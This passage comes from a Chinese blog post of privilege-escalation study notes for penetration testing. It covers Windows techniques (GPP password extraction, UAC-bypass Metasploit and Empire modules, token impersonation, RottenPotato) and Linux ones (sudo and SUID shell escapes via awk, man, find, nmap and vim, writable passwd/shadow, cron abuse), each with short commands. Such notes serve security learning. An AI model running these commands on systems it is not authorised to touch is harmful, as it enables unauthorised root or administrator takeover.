+<h4 id="3、组策略首选项提权"><a href="#3、组策略首选项提权" class="headerlink" title="3、组策略首选项提权"></a>3、组策略首选项提权</h4><p>sysvol是活动目录的一个用于存储公共文件服务器副本的共享文件夹，在域中的所有域控之间进行复制。sysvol文件夹是在安装活动目录时候自动创建的，主要用来存放登录脚本、组策略数据及其他域控需要的域信息。sysvol在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录的域范围内共享。整个sysvol目录在所有的域控中是自动同步和共享的，所有组策略在：C:\Windows\SYSVOL\domain\Policies中。</p>
+<p> 在一般域环境中所有机器都是脚本化批量部署的，数据量很大，为了方便对所有机器进行操作。网管会使用域策略进行统一的配置和管理，大多数组织在创建域环境后会要求加入域的计算机使用域用户密码进行登录验证。为了保证本地管理员的安全性，这些组织的网络管理员往往会修改本地管理员密码。通过组策略修改密码，若攻击者获得一台机器的本地管理员密码，就相当于获取整个域中所有机器的本地管理员密码。</p>
+<p>常见的组策略首选项（Group Policy Perferences，GPP）：映射驱动器（Drives.xml）、常见本地用户、数据源（DataSources.xml）、打印机配置（Printers.xml）、创建/更新服务（Services.xml）、计划任务（ScheduledTasks.xml）。</p>
+<p>利用方法，只有存在漏洞才可以利用，该漏洞对应补丁KB2962486：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Powershell获取cpassword</span><br><span class="line">Get-GPPPassword.ps1</span><br><span class="line"># Msf</span><br><span class="line">post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gpp</span><br><span class="line"># Empire</span><br><span class="line">usemodule privesc&#x2F;gpp</span><br></pre></td></tr></table></figure>
+
+<h4 id="4、绕过UAC提权"><a href="#4、绕过UAC提权" class="headerlink" title="4、绕过UAC提权"></a>4、绕过UAC提权</h4><p>uac说明：<a href="https://www.cnblogs.com/Chesky/p/UAC_Bypass.html" target="_blank" rel="noopener">https://www.cnblogs.com/Chesky/p/UAC_Bypass.html</a></p>
+<p>UAC（User Account Control，用户帐户控制）是微软在 Windows Vista 以后版本引入的一种安全机制，通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。UAC 可以阻止未经授权的应用程序自动进行安装，并防止无意中更改系统设置。</p>
+<p>UAC需要授权的动作包括：</p>
+<ul>
+<li>配置Windows Update；</li>
+<li>增加或删除用户账户；</li>
+<li>改变用户的账户类型；</li>
+<li>改变UAC设置；</li>
+<li>安装ActiveX；</li>
+<li>安装或移除程序；</li>
+<li>安装设备驱动程序；</li>
+<li>设置家长控制；</li>
+<li>将文件移动或复制到Program Files或Windows目录；</li>
+<li>查看其他用户文件夹等</li>
+</ul>
+<p>利用方法，可参考<a href="https://www.cnblogs.com/backlion/p/10552137.html：" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/10552137.html：</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Windows权限升级绕过UAC保护-进程注入</span></span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac</span><br><span class="line"><span class="comment"># Windows权限升级绕过UAC保护-内存注入</span></span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac_injection</span><br><span class="line"><span class="comment"># 绕过Windows UAC保护（通过FodHelper注册表项）</span></span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac_fodhelper</span><br><span class="line"><span class="comment"># Windows权限升级绕过UAC保护（通过Eventvwr注册表项）</span></span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac_eventvwr</span><br><span class="line"><span class="comment"># Windows权限升级绕过UAC保护（通过COM处理程序劫持）</span></span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac_comhijack</span><br><span class="line"></span><br><span class="line"><span class="comment">#Powershell</span></span><br><span class="line">Invoke-PsUACme</span><br><span class="line"></span><br><span class="line"><span class="comment">#Empire</span></span><br><span class="line">usemodule privesc/bypassuac</span><br><span class="line">usemodule privesc/bypassuac_wscript</span><br></pre></td></tr></table></figure>
+
+<h4 id="5、令牌窃取"><a href="#5、令牌窃取" class="headerlink" title="5、令牌窃取"></a>5、令牌窃取</h4><p>令牌是系统的临时密钥，相当于账户名和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的，它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌持续存在系统中，除非系统重新启动。</p>
+<p>伪造令牌进行攻击的核心是利用Kerberos协议的漏洞。</p>
+<p>通过MSF：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token WIN-2HU3N1\\Administrator  <span class="comment">#注意：这里是两个反斜杠\\</span></span><br><span class="line">shell</span><br></pre></td></tr></table></figure>
+
+<p>通过<a href="https://github.com/foxglovesec/RottenPotato.git" target="_blank" rel="noopener">烂土豆（Rotten potato）</a>提权【MS16-075】：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use incognito</span><br><span class="line">meterpreter &gt; list_tokens -u</span><br><span class="line">meterpreter &gt; upload /root/Rottenpotato/rottenpotato.exe</span><br><span class="line">meterpreter &gt; execute -HC -f rottenpotato.exe</span><br><span class="line">meterpreter &gt; getuid</span><br></pre></td></tr></table></figure>
+
+<h4 id="6、数据库提权"><a href="#6、数据库提权" class="headerlink" title="6、数据库提权"></a>6、数据库提权</h4><p>可参考：<a href="https://www.freebuf.com/articles/web/239338.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/239338.html</a></p>
+<h5 id="Mysql提权、SQL-Server提权"><a href="#Mysql提权、SQL-Server提权" class="headerlink" title="Mysql提权、SQL Server提权"></a>Mysql提权、SQL Server提权</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">分类：功能型，技巧型，漏洞型</span><br><span class="line">功能型：udf提权</span><br><span class="line">技巧型：启动项提权</span><br><span class="line">漏洞型：mof提权</span><br></pre></td></tr></table></figure>
+
+<h2 id="二、Linux提权"><a href="#二、Linux提权" class="headerlink" title="二、Linux提权"></a>二、Linux提权</h2><img src="/imgs/image-20210123134027171.png" alt="image-20210123134027171" style="zoom:50%;" />
+
+<h3 id="1、内核漏洞提权-1"><a href="#1、内核漏洞提权-1" class="headerlink" title="1、内核漏洞提权"></a>1、内核漏洞提权</h3><p>收集信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/*-release </span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure>
+
+<p>Seachsploit：根据内核信息查找漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit linux 3.10 CentOS Linux 7</span><br></pre></td></tr></table></figure>
+
+<p>linux-exploit-suggester</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/jondonas/linux-exploit-suggester-2/blob/master/linux-exploit-suggester-2.pl</span><br><span class="line">./linux-exploit-suggester-2.pl</span><br><span class="line">https://github.com/SecWiki/linux-kernel-exploits</span><br></pre></td></tr></table></figure>
+
+<p>典型示例：脏牛漏洞（CVE-2016-5195）</p>
+<h3 id="2、明文root密码提权"><a href="#2、明文root密码提权" class="headerlink" title="2、明文root密码提权"></a>2、明文root密码提权</h3><p>passwd 储存了用户，全用户可读，root 可写；</p>
+<p>shadow 存储密码的 hash，仅 root 可读写</p>
+<p>passwd 文件：daemon<code>:x:</code>1:1:daemon:/usr/sbin:/bin/sh </p>
+<p>passwd 由冒号分割，第一列是用户名，第二列是密码，x 代表密码 hash 被放在 shadow 里面了（这样非 root 就看不到了）。而 shadow 里面最重要的就是密码的 hash。</p>
+<h4 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h4><p> passwd、shadow 是否可写 </p>
+<blockquote>
+<p>ls -l passwd shadow </p>
+</blockquote>
+<p>1、passwd 可写</p>
+<p>从上面图片里看到，passwd 文件是可写的，将 passwd 的 root 密码 X 替换为我们自己的 hash，如替换为自己 linux 里的 hash，可修改目标的 root 密码</p>
+<p>2、shadow 可读</p>
+<p>把 shadow 里面 root 的 hash 辅助出来，用 hash、john 爆破</p>
+<h3 id="3、密码复用"><a href="#3、密码复用" class="headerlink" title="3、密码复用"></a>3、密码复用</h3><p>同一个密码可以被用在多个地方，比如数据库、web 后台密码 可能就是root的密码</p>
+<h3 id="4、sudo滥用"><a href="#4、sudo滥用" class="headerlink" title="4、sudo滥用"></a>4、sudo滥用</h3><p><code>/etc/sudoers</code>文件定义可以执行 sudo 的账户、定义某个应用程序用 root 访问、是否需要密码验证。可以访问<a href="https://gtfobins.github.io/查看支持的命令" target="_blank" rel="noopener">https://gtfobins.github.io/查看支持的命令</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看当前用户可以sudo的程序</span></span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<h4 id="SU"><a href="#SU" class="headerlink" title="SU:"></a>SU:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/image-20210127145327674.png" alt="image-20210127145327674"></p>
+<h4 id="awk"><a href="#awk" class="headerlink" title="awk:"></a>awk:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk <span class="string">'BEGIN &#123;system("/bin/sh")&#125;'</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/image-20210127145146086.png" alt="image-20210127145146086"></p>
+<h4 id="man"><a href="#man" class="headerlink" title="man:"></a>man:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo man man</span><br><span class="line"><span class="comment"># 进入后 输入下面命令进入命令行</span></span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/image-20210127145821823.png" alt="image-20210127145821823"></p>
+<h3 id="5、su-root被禁止登录"><a href="#5、su-root被禁止登录" class="headerlink" title="5、su root被禁止登录"></a>5、su root被禁止登录</h3><h4 id="场景："><a href="#场景：" class="headerlink" title="场景："></a>场景：</h4><p>拿到 root 密码，端口转发，代理，但防护墙禁止其他人登录 root，在原来的低权限 shell，也无法 sudo 切换 root 。</p>
+<h4 id="原因："><a href="#原因：" class="headerlink" title="原因："></a>原因：</h4><p>因为出于安全考虑，linux 要求用户必须从终端设备（tty）中输入密码，而不是标准输入（stdin）。 </p>
+<p>所以 sudo 在你输入密码的时候本质上是读取了键盘，而不是读取 bash 里面输入的字符。 </p>
+<h4 id="利用：-1"><a href="#利用：-1" class="headerlink" title="利用："></a>利用：</h4><p>python 语法:</p>
+<blockquote>
+<p>python -c ‘import pty;pty.spawn(“/bin/sh”)’ </p>
+</blockquote>
+<p>交互 shell，简单 shell 中直接按删除键是不行的，要按住 ctrl 键之后，再按住删除键才可以，其他键的使用也一样 </p>
+<blockquote>
+<p>$ sudo su</p>
+</blockquote>
+<h3 id="6、计划任务"><a href="#6、计划任务" class="headerlink" title="6、计划任务"></a>6、计划任务</h3><p>非 root 权限的用户是不可以列出 root 用户的计划任务的。但是 /etc/ 内系统的计划任务可以被列出，并且默认这些程序以 root 权限执行 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc/cron*</span><br></pre></td></tr></table></figure>
+
+<p>如果定时任务里面有普通用户权限的定时任务，则可以修改定时任务的脚本来达到以root执行命令的目的。</p>
+<h3 id="7、SUID"><a href="#7、SUID" class="headerlink" title="7、SUID"></a>7、SUID</h3><p>SUID 是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行【ls 查看时有 s 属性才支持 SUID】，</p>
+<p>如 passwd 文件，普通用户不能直接读写，但可通过 passwd 命令，以 root 权限修改 shadow（因为 shadow 是 root 权限文件，修改会以 root 权限修改）</p>
+<h4 id="查找正在系统上运行的所有SUID可执行文件"><a href="#查找正在系统上运行的所有SUID可执行文件" class="headerlink" title="查找正在系统上运行的所有SUID可执行文件"></a>查找正在系统上运行的所有SUID可执行文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用：-2"><a href="#利用：-2" class="headerlink" title="利用："></a>利用：</h4><p>提权思路：<br>某设置了suid的程序， 执行时可交互修改某文件或执行命令。那通过运行这个程序， 就获得了root权限。<br>vim<br>：set shell=/bin/sh<br>： shell</p>
+<p><strong>比如发现了find</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#随便新建一个文件，或利用已有文件</span></span><br><span class="line">touch abc</span><br><span class="line"></span><br><span class="line"><span class="comment">#以SUID即root权限执行命令</span></span><br><span class="line">find abc -<span class="built_in">exec</span> whomai \;</span><br></pre></td></tr></table></figure>
+
+<p><strong>nmap SUID提权</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#2.02 to 5.21版本 用交互模式执行shell命令</span></span><br><span class="line">sudo nmap --interactive		</span><br><span class="line">nmap&gt; !sh</span><br></pre></td></tr></table></figure>
+
+<h3 id="8、Docker逃逸"><a href="#8、Docker逃逸" class="headerlink" title="8、Docker逃逸"></a>8、Docker逃逸</h3><p>参考：<a href="https://www.freebuf.com/articles/system/170783.html，https://blog.csdn.net/qq_41874930/article/details/109216506，https://www.cnblogs.com/xiaozi/p/13423853.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/170783.html，https://blog.csdn.net/qq_41874930/article/details/109216506，https://www.cnblogs.com/xiaozi/p/13423853.html</a></p>
+<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://yoga7xm.top/2019/04/09/IPentest-admin/#Windows-Hash%E8%8E%B7%E5%8F%96" target="_blank" rel="noopener">https://yoga7xm.top/2019/04/09/IPentest-admin/#Windows-Hash%E8%8E%B7%E5%8F%96</a></p>
+<p><a href="https://wiki.wgpsec.org/knowledge/hw/privilege.html#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87" target="_blank" rel="noopener">https://wiki.wgpsec.org/knowledge/hw/privilege.html#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87</a></p>
+<p><a href="https://www.freebuf.com/articles/system/254836.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/254836.html</a></p>
+<p><a href="https://www.cnblogs.com/-mo-/p/12718115.html" target="_blank" rel="noopener">https://www.cnblogs.com/-mo-/p/12718115.html</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/1544037" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1544037</a></p>
+<p><a href="https://www.freebuf.com/articles/web/239338.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/239338.html</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#一、Windows提权"><span class="toc-number">1.</span> <span class="toc-text">一、Windows提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows权限"><span class="toc-number">1.1.</span> <span class="toc-text">Windows权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常见提权方法"><span class="toc-number">1.2.</span> <span class="toc-text">常见提权方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、内核漏洞提权"><span class="toc-number">1.2.1.</span> <span class="toc-text">1、内核漏洞提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#常用的提权漏洞："><span class="toc-number">1.2.1.1.</span> <span class="toc-text">常用的提权漏洞：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#寻找缺失补丁"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">寻找缺失补丁</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、系统配置错误提权"><span class="toc-number">1.2.2.</span> <span class="toc-text">2、系统配置错误提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#系统权限配置错误"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">系统权限配置错误</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#注册表键AlwaysInstallElevated提权"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">注册表键AlwaysInstallElevated提权</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#可信任服务路径漏洞"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">可信任服务路径漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#计划任务"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">计划任务</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、组策略首选项提权"><span class="toc-number">1.2.3.</span> <span class="toc-text">3、组策略首选项提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、绕过UAC提权"><span class="toc-number">1.2.4.</span> <span class="toc-text">4、绕过UAC提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5、令牌窃取"><span class="toc-number">1.2.5.</span> <span class="toc-text">5、令牌窃取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6、数据库提权"><span class="toc-number">1.2.6.</span> <span class="toc-text">6、数据库提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Mysql提权、SQL-Server提权"><span class="toc-number">1.2.6.1.</span> <span class="toc-text">Mysql提权、SQL Server提权</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二、Linux提权"><span class="toc-number">2.</span> <span class="toc-text">二、Linux提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、内核漏洞提权-1"><span class="toc-number">2.1.</span> <span class="toc-text">1、内核漏洞提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、明文root密码提权"><span class="toc-number">2.2.</span> <span class="toc-text">2、明文root密码提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#利用："><span class="toc-number">2.2.1.</span> <span class="toc-text">利用：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3、密码复用"><span class="toc-number">2.3.</span> <span class="toc-text">3、密码复用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4、sudo滥用"><span class="toc-number">2.4.</span> <span class="toc-text">4、sudo滥用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SU"><span class="toc-number">2.4.1.</span> <span class="toc-text">SU:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#awk"><span class="toc-number">2.4.2.</span> <span class="toc-text">awk:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#man"><span class="toc-number">2.4.3.</span> <span class="toc-text">man:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5、su-root被禁止登录"><span class="toc-number">2.5.</span> <span class="toc-text">5、su root被禁止登录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#场景："><span class="toc-number">2.5.1.</span> <span class="toc-text">场景：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#原因："><span class="toc-number">2.5.2.</span> <span class="toc-text">原因：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用：-1"><span class="toc-number">2.5.3.</span> <span class="toc-text">利用：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6、计划任务"><span class="toc-number">2.6.</span> <span class="toc-text">6、计划任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7、SUID"><span class="toc-number">2.7.</span> <span class="toc-text">7、SUID</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#查找正在系统上运行的所有SUID可执行文件"><span class="toc-number">2.7.1.</span> <span class="toc-text">查找正在系统上运行的所有SUID可执行文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用：-2"><span class="toc-number">2.7.2.</span> <span class="toc-text">利用：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8、Docker逃逸"><span class="toc-number">2.8.</span> <span class="toc-text">8、Docker逃逸</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接："><span class="toc-number">3.</span> <span class="toc-text">参考链接：</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/01/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A3%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2021/01/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A3%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&text=内网安全学习笔记-Ⅳ：权限提升" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/01/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A3%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&title=内网安全学习笔记-Ⅳ：权限提升" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/01/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A3%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&is_video=false&description=内网安全学习笔记-Ⅳ：权限提升" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=内网安全学习笔记-Ⅳ：权限提升&body=Check out this article: http://yoursite.com/2021/01/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A3%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2021/01/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A3%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&title=内网安全学习笔记-Ⅳ：权限提升" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2021/01/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A3%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&title=内网安全学习笔记-Ⅳ：权限提升" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/01/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A3%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&title=内网安全学习笔记-Ⅳ：权限提升" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2021/01/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A3%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&title=内网安全学习笔记-Ⅳ：权限提升" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/01/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A3%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&name=内网安全学习笔记-Ⅳ：权限提升&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/01/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A3%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&t=内网安全学习笔记-Ⅳ：权限提升" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2021
+    R17a
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
